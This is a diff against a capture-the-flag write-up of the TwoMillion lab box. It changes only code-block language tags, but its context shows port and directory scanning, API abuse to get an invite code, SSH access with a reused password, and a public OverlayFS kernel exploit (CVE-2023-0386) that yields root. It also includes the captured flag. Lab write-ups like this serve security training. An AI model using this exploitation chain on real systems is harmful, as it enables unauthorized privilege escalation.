@@ -35,7 +35,7 @@ TwoMillion is an Easy difficulty Linux box that was released to celebrate reachi
 
 I started by scanning all TCP ports:
 
-```text
+```bash
 ┌──(kali㉿DESKTOP-PTKVJHV)-[~]
 └─$ nmap -sC -sV -p- -T4 --min-rate 1000 10.129.229.66
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 15:09 +0700
@@ -65,7 +65,7 @@ There are **two** open TCP ports: 22 and 80. The website redirects to `http://2m
 
 I used `feroxbuster` to find directories and endpoints. The output below shows the results I kept after excluding the 500 error responses:
 
-```text
+```bash
 ┌──(kali㉿DESKTOP-PTKVJHV)-[~]
 └─$ feroxbuster -u http://2million.htb
 
@@ -114,7 +114,7 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 
 I used `ffuf` to check whether `2million.htb` had any additional subdomains:
 
-```text
+```bash
 ┌──(kali㉿DESKTOP-PTKVJHV)-[~]
 └─$ ffuf -u http://10.129.229.66 -H "Host: FUZZ.2million.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
 
@@ -219,7 +219,7 @@ I decoded it with [rot13.com](https://rot13.com/). It instructed me to send a PO
 
 I sent the requested POST request:
 
-```text
+```bash
 ┌──(kali㉿DESKTOP-PTKVJHV)-[~]
 └─$ curl -s -X POST http://2million.htb/api/v1/invite/generate
 {"0":200,"success":1,"data":{"code":"SkFNWkktS0RJVjYtOFNSSkwtRjA4UUU=","format":"encoded"}}
@@ -227,7 +227,7 @@ I sent the requested POST request:
 
 The returned value was Base64 encoded, so I decoded it:
 
-```text
+```bash
 ┌──(kali㉿DESKTOP-PTKVJHV)-[~]
 └─$ echo "SkFNWkktS0RJVjYtOFNSSkwtRjA4UUU=" | base64 -d
 JAMZI-KDIV6-8SRJL-F08QE
@@ -363,14 +363,14 @@ Among the returned files, `.env` was particularly interesting because it commonl
 
 Because the password was reused, I tried it with the `admin` account over SSH:
 
-```text
+```bash
 ┌──(kali㉿DESKTOP-PTKVJHV)-[~]
 └─$ ssh admin@2million.htb
 ```
 
 After logging in, I listed the home directory and read `user.txt`:
 
-```text
+```bash
 admin@2million:~$ ls -la
 total 32
 drwxr-xr-x 4 admin admin 4096 Jun  6  2023 .
@@ -399,7 +399,7 @@ I read the email in `/var/mail/admin`. It mentioned a vulnerability involving Ov
 
 I checked the kernel and operating system versions:
 
-```text
+```bash
 admin@2million:~$ uname -a
 Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 
@@ -432,20 +432,20 @@ https://github.com/xkaneiki/CVE-2023-0386
 
 The `admin` user on the target did not have Internet access, so I downloaded the POC locally and copied it to the machine:
 
-```text
+```powershell
 PS D:\> scp -r D:\CVE-2023-0386-main.zip admin@2million.htb:/tmp/
 ```
 
 I checked that the file had arrived:
 
-```text
+```bash
 admin@2million:/tmp$ ls
 CVE-2023-0386-main.zip
 ```
 
 Then I extracted it and read the `README.md` instructions:
 
-```text
+```bash
 admin@2million:/tmp$ unzip CVE-2023-0386-main.zip
 Archive:  CVE-2023-0386-main.zip
 c4c65cefca1365c807c397e953d048506f3de195
@@ -467,20 +467,20 @@ admin@2million:/tmp/CVE-2023-0386-main$ cat README.md
 
 The POC required two terminals. In the first terminal, I compiled the files and started FUSE:
 
-```text
+```bash
 admin@2million:/tmp/CVE-2023-0386-main$ make all
 admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
 ```
 
 In the second terminal, I ran the exploit:
 
-```text
+```bash
 admin@2million:/tmp/CVE-2023-0386-main$ ./exp
 ```
 
 The exploit succeeded and gave me a root shell:
 
-```text
+```bash
 uid:1000 gid:1000
 [+] mount success
 total 8
@@ -495,7 +495,7 @@ root@2million:/tmp/CVE-2023-0386-main#
 
 I read the root flag from `/root/root.txt`:
 
-```text
+```bash
 root@2million:/root# cat root.txt
 fb4411f35f92f1cd4982aab0d26ebfd1
 root@2million:/root#
@@ -505,7 +505,7 @@ root@2million:/root#
 
 Finally, I checked the GLIBC version installed on TwoMillion:
 
-```text
+```bash
 root@2million:/root# ldd --version
 ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
 Copyright (C) 2022 Free Software Foundation, Inc.
